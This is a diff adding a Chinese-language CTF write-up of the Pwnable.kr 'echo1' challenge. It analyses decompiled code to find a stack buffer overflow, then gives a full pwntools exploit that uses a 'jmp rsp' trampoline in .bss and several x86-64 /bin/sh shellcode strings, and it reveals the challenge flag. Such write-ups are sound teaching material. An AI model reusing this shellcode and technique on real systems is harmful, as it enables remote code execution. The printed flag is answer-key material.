@@ -15984,3 +15984,170 @@ you_will_never_guess_this_sugar_honey_salt_cookie
 
 ------
 
+### echo1
+
+这是**Pwnable.kr**的第三十三个挑战`echo1`，来自**[Rookiss]**部分。
+
+```bash
+Pwn this echo service.
+
+download : http://pwnable.kr/bin/echo1
+
+Running at : nc pwnable.kr 9010
+```
+
+这题只给出一个二进制文件`echo1`，让我们下载看看文件信息。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/echo1 
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ sudo chmod +x ./echo1
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ file ./echo1      
+./echo1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fa367b7e8f66b68737a56333996d80f0d72e54ea, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ checksec --file=./echo1 
+[*] '/home/tyd/ctf/pwn/pwnable.kr/echo1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 64bit`打开二进制文件`echo1`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  _QWORD *v3; // rax
+  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
+  _QWORD v6[4]; // [rsp+10h] [rbp-20h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  o = malloc(0x28uLL);
+  *((_QWORD *)o + 3) = greetings;
+  *((_QWORD *)o + 4) = byebye;
+  printf("hey, what's your name? : ");
+  __isoc99_scanf("%24s", v6);
+  v3 = o;
+  *(_QWORD *)o = v6[0];
+  v3[1] = v6[1];
+  v3[2] = v6[2];
+  id = v6[0];
+  getchar();
+  func[0] = (__int64)echo1;
+  qword_602088 = (__int64)echo2;
+  qword_602090 = (__int64)echo3;
+  for ( i = 0; i != 121; i = getchar() )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        puts("\n- select echo type -");
+        puts("- 1. : BOF echo");
+        puts("- 2. : FSB echo");
+        puts("- 3. : UAF echo");
+        puts("- 4. : exit");
+        printf("> ");
+        __isoc99_scanf("%d", &i);
+        getchar();
+        if ( i > 3 )
+          break;
+        ((void (*)(void))func[i - 1])();
+      }
+      if ( i == 4 )
+        break;
+      puts("invalid menu");
+    }
+    cleanup();
+    printf("Are you sure you want to exit? (y/n)");
+  }
+  puts("bye");
+  return 0;
+}
+```
+
+根据题目名称选择`echo1`，该函数调用`get_input()`从标准输入中读取`128`个字节到大小为`0x20`字节的`char`型数组`s`，存在栈溢出漏洞，可以先用`0x20+0x8`个`padding`进行填充。
+
+```c
+__int64 echo1()
+{
+  char s[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  (*((void (__fastcall **)(void *))o + 3))(o);
+  get_input(s, 128LL);
+  puts(s);
+  (*((void (__fastcall **)(void *))o + 4))(o);
+  return 0LL;
+}
+```
+
+`id`位于`.bss`段上，我们第一次输入可以写入`jmp rsp`，这样在`leave; retn;`后能通过`rsp`跳转到`shellcode`，构造`payload`时可以``cyclic(0x20+0x8) + p64(id_addr) + shellcode`。
+
+```assembly
+.bss:0000000000602098 o               dq ?                    ; DATA XREF: echo1+8↑r
+.bss:0000000000602098                                         ; echo1+13↑r ...
+.bss:00000000006020A0                 public id
+.bss:00000000006020A0 id              dd ?                    ; DATA XREF: main+C5↑w
+```
+
+至于为什么要写入`jmp rsp`，通过调试可以清楚地显示。
+
+```assembly
+────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
+   0x40085f       <echo1+71>    mov    rax, qword ptr [rip + 0x201832] <0x602098>
+   0x400866       <echo1+78>    mov    rdi, rax
+   0x400869       <echo1+81>    call   rdx
+ 
+   0x40086b       <echo1+83>    mov    eax, 0
+   0x400870       <echo1+88>    leave  
+ ► 0x400871       <echo1+89>    ret             <0x6020a0; id>
+    ↓
+   0x6020a0       <id>          jmp    rsp
+    ↓
+   0x7fffce3ed600               push   rax
+   0x7fffce3ed601               xor    rdx, rdx
+   0x7fffce3ed604               xor    rsi, rsi
+   0x7fffce3ed607               movabs rbx, 0x68732f2f6e69622f
+──────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────
+00:0000│ rsp  0x7fffce3ed5f8 —▸ 0x6020a0 (id) ◂— jmp    rsp /* 0xe4ff */
+01:0008│      0x7fffce3ed600 ◂— 0x48f63148d2314850
+02:0010│      0x7fffce3ed608 ◂— 0x732f2f6e69622fbb
+03:0018│      0x7fffce3ed610 ◂— 0x50f3bb05f545368
+04:0020│      0x7fffce3ed618 —▸ 0x40000a ◂— add    byte ptr [rax], al
+05:0028│      0x7fffce3ed620 —▸ 0x7fffce3ed710 ◂— 0x1
+06:0030│      0x7fffce3ed628 ◂— 0x0
+07:0038│      0x7fffce3ed630 —▸ 0x400a90 (__libc_csu_init) ◂— mov    qword ptr [rsp - 0x28], rbp
+```
+
+构造`shellcode`时可以参考我在 [**Linux ShellCode总结**](https://github.com/Don2025/CTFwriteUp/blob/main/Notes/Linux%20ShellCode%E6%80%BB%E7%BB%93.md) 中写的64位汇编代码，编写`Python`代码求解，拿到`shell`后输入`cat flag`即可得到`H4d_som3_fun_w1th_ech0_ov3rfl0w`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('pwnable.kr', 9010)
+id_addr = 0x6020a0
+io.sendlineafter(b' : ', asm('jmp rsp'))
+io.sendlineafter(b'> ', b'1')
+shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
+# 这些shellcode都能打通
+# shellcode = b'\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
+# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
+# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
+# shellcode = b'H1\xffH1\xf6H1\xd2H1\xc0PH\xbb/bin//shSH\x89\xe7\xb0;\x0f\x05'
+payload = cyclic(0x20+0x8) + p64(id_addr) + shellcode
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
